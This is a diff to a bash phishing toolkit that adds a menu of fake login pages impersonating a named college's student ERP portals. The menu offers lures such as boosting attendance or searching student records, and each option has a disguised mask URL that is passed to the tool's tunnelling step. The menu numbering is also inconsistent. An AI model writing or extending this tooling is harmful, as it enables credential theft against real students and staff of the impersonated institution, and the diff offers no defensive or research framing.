@@ -456,6 +456,47 @@ tunnel_menu() {
 	esac
 }
 
+##PSIT
+site_psit() {
+	cat <<-EOF
+	
+		${RED}[${WHITE}01${RED}]${ORANGE} Psit Normal Portal
+		${RED}[${WHITE}01${RED}]${ORANGE} Psitche Normal Portal
+		${RED}[${WHITE}02${RED}]${ORANGE} Increase Presenty
+		${RED}[${WHITE}03${RED}]${ORANGE} Search About Students
+		${RED}[${WHITE}04${RED}]${ORANGE} Advanced Page
+	
+	EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="psit"
+			mask='http://erp.psit.ac.in/'
+			tunnel_menu;;
+		2 | 02)
+			website="psit"
+			mask='http://erp.psitche.ac.in/'
+			tunnel_menu;;
+		3 | 03)
+			website="psit"
+			mask='http://erp.psitche.ac.in/ERP/Student/Attendance/'
+			tunnel_menu;;
+		4 | 04)
+			website="psit"
+			mask='http://erp.psitche.ac.in/SearchStudents/'
+			tunnel_menu;;
+		5 | 05)
+			website="psit"
+			mask='http://erp.psitche.ac.in/accessing/'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_psit; };;
+	esac
+}
+
 ## Facebook
 site_facebook() {
 	cat <<- EOF
@@ -740,9 +781,7 @@ main_menu() {
 			mask='http://get-discord-nitro-free'
 			tunnel_menu;;
 		35)
-			website="psit"
-			mask='http://get-psit-portal-free'
-			tunnel_menu;;
+			site_psit;;
 		99)
 			about;;
 		0 | 00 )
